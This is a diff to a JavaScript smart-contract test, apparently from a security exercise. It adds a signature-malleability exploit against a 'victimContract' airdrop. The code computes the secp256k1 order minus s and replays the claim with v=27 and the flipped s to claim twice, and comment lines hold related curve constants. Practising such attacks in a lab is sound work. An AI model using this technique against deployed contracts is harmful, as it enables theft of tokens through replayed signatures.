@@ -25,9 +25,19 @@ describe(NAME, function () {
             const r = "0xf202ed96ca1d80f41e7c9bbe7324f8d52b03a2c86d9b731a1d99aa018e9d77e7";
             const s = "0x7477cb98813d501157156e965b7ea359f5e6c108789e70d7d6873e3354b95f69";
 
+            const num = new ethers.BigNumber.from("0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141")
+
+            const big_r = new ethers.BigNumber.from("0xf202ed96ca1d80f41e7c9bbe7324f8d52b03a2c86d9b731a1d99aa018e9d77e7")
+            const big_s = new ethers.BigNumber.from("0x7477cb98813d501157156e965b7ea359f5e6c108789e70d7d6873e3354b95f69")
+            const sub_num = num.sub(big_s)
+
             await victimContract
                 .connect(attackerWallet)
                 .claimAirdrop("0x70997970c51812dc3a010c7d01b50e0d17dc79c8", ethers.utils.parseEther("1"), v, r, s);
+
+            await victimContract
+                .connect(attackerWallet)
+                .claimAirdrop("0x70997970c51812dc3a010c7d01b50e0d17dc79c8", ethers.utils.parseEther("1"), 27, r, sub_num._hex);
         });
 
         it("conduct your attack here", async function () {});
@@ -37,3 +47,7 @@ describe(NAME, function () {
         });
     });
 });
+
+// 11579208923731619542357098500868790785283756427907490438260516314151816149433
+// 11579208923731619542357098500868790785283756427907490438260516314151816149433
+// 5789604461865897711785492504343953926418782139537452191302581570759080747165
